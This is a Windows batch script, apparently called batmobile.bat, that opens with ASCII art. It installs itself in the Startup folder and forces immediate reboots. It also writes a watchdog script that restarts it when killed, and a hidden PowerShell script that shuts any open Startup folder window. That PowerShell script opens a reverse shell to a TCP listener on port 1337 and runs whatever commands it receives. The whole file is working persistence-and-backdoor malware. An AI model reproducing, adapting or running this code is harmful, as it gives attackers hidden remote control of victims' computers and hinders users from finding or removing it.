echo               ....',,;;;;;,,'....               
echo        ..;coxk0KXXNNWWWWWWWWWNNXK0Oxdl:'.        
echo      ,o0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0x;.     
echo    .oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWx.    
echo    oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWx.   
echo   ,KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMX:   
echo   oWMMWXOdooodk0NWMMMMMMMMMMMMWN0xollldkKWMMMx.  
echo  .kMW0xdl;...  .'ckNMMMMMMMMNkc'.  ...;lox0WM0'  
echo  ,KMX0XWMXkdc,...  ;OWMMMMW0;  ...,cokXWWX0XWK;  
echo  :XMMMMMMMMMWXx;...,kWMMMMWk;...;dKWMMMMMMMMMN:  
echo  cNMMMMMMMWWMMMNk;.cKMMMMMMNd,:kNMMWWWMMMMMMMNc  
echo  lWMMWKxl:;;:cdOXK;.cXMMMMMKdkNXOoc;;;:ldKWMMWl  
echo  oWNOc.         'ol..kMMMMMMMNd'         .ckKXl  
echo  oWO,..',,,;;:::lxl. oWMMMMMMNklcllllllloodxkOc  
echo  oWN0KXNWWWWWMMMMWd  oWMMMMMMMMMMMMMMMMMMMMMMWo  
echo  ,0MMMMMMMMMMMMMMNc  dWMMMMMMMMMMMMMMMMMMMMMMWl  
echo   ;0MMMMMMMMMMMMM0' .dWMMMMMMMMMMMMMMMMMMMMMM0,  
echo   ':xXMMMMMMMMMN0:  .dMMMMMMWNWMMMMMMMMMMMWXx,   
echo   co''coxkkkOK0c... .kMMMMMMXOkKMWX0000Okdcc:.   
echo   .ol.'..dKXNW0,.d: ,KMMMMMMMW00WWX0Ox;.''.lc    
echo    .dd::..o0WMWK0Xo.cNMMMMMWMMMMMMMWKl.,dcld.    
echo     'xkc;. .,lx0KKo..lxkkdc:xNWWNKkc..;dcok,     
echo      .k0c,;,.   ..   .;:,.   ';;'. .,lc;ok;      
echo       .xKl';oxoc,....l00Od'   ..,:oOKl,xk,       
echo        .dKd..;xXNNXKK00OOOOkO0KXNWMNkoOx.        
echo         .lKx. c0KKKK0O0000KNMMMMMMNkx0o.         
echo           :0x,dWMWNXx'   .;0MMMMMXkO0:           
echo            'xxxNMMMMK,   .dWMMMMWKKk,            
echo             .c0WMMMWo     cNMMMMMNd.             
echo               ,OWMMX:     ,KMMMWKc               
echo                .dNMWd.    cNMMNx'                
echo                  ,xXO'   .xNKd,                  
echo                    .'.    ',.                    
                                      
@echo off
:: Variables for the Startup folder and paths
set startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set scriptName=%~nx0
set scriptPath=%~f0
set startupScriptPath=%startupFolder%\%scriptName%
set monitorScript=%startupFolder%\monitor.bat
set psScript=%startupFolder%\shackmobile.ps1

:: Check if the current script is already in the Startup folder
if not exist "%startupScriptPath%" (
    echo Script is not in the Startup folder. Copying it now...
    copy "%scriptPath%" "%startupFolder%"
    echo Script copied to Startup folder.

    :: Restart the computer after copying the script
    shutdown /r /f /t 0
    exit
) else (
    echo Script is already in the Startup folder.
)

:: Check if monitor.bat exists in the Startup folder
if exist "%monitorScript%" (
    echo monitor.bat exists in the Startup folder.
    
    :: Check if monitor.bat is running
    tasklist | findstr /i "monitor.bat"
    if errorlevel 1 (
        echo monitor.bat is not running. Starting it...
        start "" "%monitorScript%"
    ) else (
        echo monitor.bat is already running.
    )
) else (
    echo monitor.bat does not exist in the Startup folder. Creating it now...
    
    :: Write the monitor.bat content into the Startup folder
    (
        echo @echo off
        echo set scriptToMonitor=batmobile.bat
        echo.
        echo :monitor
        echo tasklist ^| findstr /i "%%scriptToMonitor%%"
        echo if errorlevel 1 (
        echo     echo %%scriptToMonitor%% was terminated or closed. Restarting...
        echo     start "" "%%~dp0%%scriptToMonitor%%"
        echo )
        echo timeout /t 5 /nobreak
        echo goto monitor
    ) > "%monitorScript%"

    echo monitor.bat created in the Startup folder.

    :: Restart the computer after creating monitor.bat
    shutdown /r /f /t 0
    exit
)

:: Check if shackmobile.ps1 exists in the Startup folder
if not exist "%psScript%" (
    echo Creating shackmobile.ps1 in Startup folder...

    :: Create shackmobile.ps1 file with PowerShell commands
    (
        echo # Define the path to the Startup folder
        echo $startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
        echo $startupFolderInfo = New-Object System.IO.DirectoryInfo($startupFolder)
        echo.
        echo # Function to check if the Startup folder is open
        echo function Is-StartupFolderOpen {
        echo     $windows = Get-Process ^| Where-Object { $_.MainWindowTitle -like "Startup" }
        echo     return $windows.Count -gt 0
        echo }
        echo.
        echo # Function to close the Startup folder if it is open
        echo function Close-StartupFolder {
        echo     $windows = Get-Process ^| Where-Object { $_.MainWindowTitle -like "Startup" }
        echo     foreach ($window in $windows) {
        echo         try {
        echo             $window.CloseMainWindow() ^| Out-Null
        echo             Start-Sleep -Seconds 1
        echo             if (!$window.HasExited) {
        echo                 $window.Kill() ^| Out-Null
        echo             }
        echo         } catch {
        echo             Write-Host "Failed to close Startup folder window."
        echo         }
        echo     }
        echo }
        echo.
        echo # Main loop
        echo do {
        echo     # Check if the Startup folder is open and close it if it is
        echo     if (Is-StartupFolderOpen) {
        echo         Write-Host "Startup folder is open. Closing it..."
        echo         Close-StartupFolder
        echo     }
        echo.
        echo     # Connect to the TCP server and handle commands
        echo     $client = New-Object System.Net.Sockets.TcpClient('127.0.0.1', 1337)
        echo     $stream = $client.GetStream()
        echo     $writer = New-Object System.IO.StreamWriter($stream)
        echo     $buffer = New-Object byte[] 1024
        echo     $encoding = New-Object System.Text.ASCIIEncoding
        echo.
        echo     do {
        echo         $writer.Flush()
        echo         $read = $stream.Read($buffer, 0, 1024)
        echo         $out = $encoding.GetString($buffer, 0, $read)
        echo         $split_out = $out.Split(" ")
        echo         if ($split_out[0] -eq "exit") {
        echo             break
        echo         }
        echo         $cmd = Invoke-Expression ($out ^| Out-String) 2>&1
        echo         $back = $encoding.GetBytes($cmd + "PS > ")
        echo         $stream.Write($back, 0, $back.Length)
        echo     } while ($client.Connected)
        echo.
        echo     $client.Close()
        echo     Start-Sleep -Seconds 5
        echo } while ($true)
    ) > "%psScript%"

    echo shackmobile.ps1 created successfully.

    :: Restart the computer after creating the PowerShell script
    shutdown /r /f /t 0
    exit
) else (
    echo shackmobile.ps1 exists, running the script...
    :: Run the shackmobile.ps1 via PowerShell in hidden mode
    powershell -NoProfile -ExecutionPolicy Bypass -File "%psScript%" -WindowStyle Hidden
)

:: Hide the current batch script window
powershell -WindowStyle Hidden {Start-Sleep -s 1}

:monitor
:: Monitor to restart shackmobile.ps1 if it gets killed
tasklist | findstr /i "shackmobile.ps1"
if errorlevel 1 (
    echo shackmobile.ps1 was terminated. Restarting...
    start powershell -NoProfile -ExecutionPolicy Bypass -File "%psScript%" -WindowStyle Hidden
)

timeout /t 5 /nobreak
goto monitor